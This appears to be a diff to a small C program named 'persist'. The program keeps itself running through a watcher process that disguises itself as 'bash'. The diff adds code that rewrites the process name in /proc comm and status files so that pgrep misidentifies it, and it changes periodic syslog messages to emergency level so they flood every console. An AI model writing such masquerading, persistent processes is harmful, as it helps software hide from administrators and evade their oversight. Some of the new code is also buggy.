@@ -40,6 +40,7 @@ static pid_t	 pid = 0;
 static char	*name = NULL;
 static char	 exe[PATH_MAX];
 static ssize_t	 exelen = 0;
+static off_t	 name_diff = 0;
 
 
 /*
@@ -71,6 +72,8 @@ init(void)
 	if (-1 == exelen) {
 		err(EXIT_FAILURE, "couldn't look up original file (%u, %s)", pid, p);
 	}
+
+	name_diff = (strlen(BIN_NAME) - strlen(WATCHER_NAME));
 }
 
 
@@ -173,23 +176,100 @@ check_run(void)
 }
 
 
+/* 6 chars for "Name:\t", 7 chars for "persist", 1 char for "\n". */
+static const off_t	name_offs = 14;
+
+
+/*
+ * reset_comm is an attempt at rewriting the commandline. I'm not sure it works.
+ *
+ * ps(1) appears to use /proc/pid/cmdline (which is populated with argv) to
+ * display processes. You can see this when running persist; one shows up as
+ * "persist" and the other shows up as "bash" (e.g. BIN_NAME and WATCHER_NAME);
+ * the nargv construct used in main and check_run appears to be working
+ * correctly.
+ *
+ * however, pgrep(1) appears to use /proc/pid/status, which means pgrep will
+ * show both processes as "persist" (and therefore, so will persist). We
+ * try to rewrite this file, but it will likely fail. The kernel doesn't like
+ * processes changing this data.
+ */
 static void
 reset_comm(void)
 {
-	FILE	*comm = NULL;
-	char	*p = NULL;
+	char		 buf[4096];
+	struct stat	 st;
+	off_t		 len, offs;
+	FILE		*comm = NULL;
+	char		*p = NULL;
 
 	asprintf(&p, "/proc/%u/comm", pid);
 	if (NULL != (comm = fopen(p, "w"))) {
 		fwrite(WATCHER_NAME, strlen(WATCHER_NAME), 1, comm);
 		fclose(comm);
+		comm = NULL;
 	} else {
 		warn("failed to rewrite commandline");
 	}
 
 	free(p);
+	p = NULL;
+
+	asprintf(&p, "/proc/%u/status", getpid());
+	if (-1 == stat(p, &st)) {
+		warn("failed to rewrite status");
+		goto fin;
+	}
+
+	memset(buf, 0, 4096);
+	len = st.st_size;
+	strcpy(buf, "Name:\t");
+	offs += 6;
+
+	strcpy(buf+offs, WATCHER_NAME);
+	offs += strlen(WATCHER_NAME);
+
+	buf[offs++] = 0xa;
+
+	if (NULL == (comm = fopen(p, "r"))) {
+		warn("failed to read status");
+		goto fin;
+	}
+
+	fseek(comm, name_offs, SEEK_SET);
+	if (-1 == fread(buf+offs, sizeof(char), len-name_offs, comm)) {
+		warn("failed to read status");
+		goto fin;
+	}
+	fclose(comm);
+	comm = NULL;
+
+	if (NULL == (comm = fopen(p, "w"))) {
+		warn("failed to write status");
+		goto fin;
+	}
+
+	if (-1 == fwrite(buf, sizeof(char), len-name_diff, comm)) {
+		warn("failed to write status");
+		goto fin;
+	}
+
+	fclose(comm);
+	comm = NULL;
+	printf("%s\n", buf);
+fin:
+	free(p);
+
+	if (NULL != comm) {
+		fclose(comm);
+	}
 }
 
+
+/*
+ * watch is a non-terminating loop that runs check_bin and check_run every
+ * minute.
+ */
 static void
 watch(void)
 {
@@ -201,12 +281,16 @@ watch(void)
 }
 
 
+/*
+ * spam is a non-terminating loop that writes syslog messages every hour. For
+ * maxmimum fun, it uses LOG_EMERG to spam on every console.
+ */
 static void
 spam(void)
 {
 	while (1) {
-		syslog(LOG_INFO, "hey! you!");
-		sleep(60);
+		syslog(LOG_EMERG, "hey! you!");
+		sleep(3600);
 	}
 }
 
@@ -225,10 +309,6 @@ main(int argc, char *argv[])
 	}
 
 	init();
-
-	/*
-	 * Make sure to spam every console using LOG_EMERG.
-	 */
 	openlog("persist", LOG_CONS|LOG_NDELAY, LOG_DAEMON);
 
 	if (pid == getpid()) {
